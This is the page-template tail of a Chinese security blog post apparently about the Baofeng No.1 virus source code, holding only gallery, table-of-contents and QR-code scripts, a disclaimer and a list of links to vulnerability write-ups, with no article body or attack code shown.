  windows](https://mrxn.net/tag/windows)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录

×



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：
[Mrxn's Blog](https://mrxn.net/)
  
文章标题：
[从暴风一号病毒源码里面找到的宝贝](https://mrxn.net/jswz/57.html)
  
文章链接：
<https://mrxn.net/jswz/57.html>
  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

设备上扫码阅读



var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/57.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

手机扫码阅读



var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/57.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});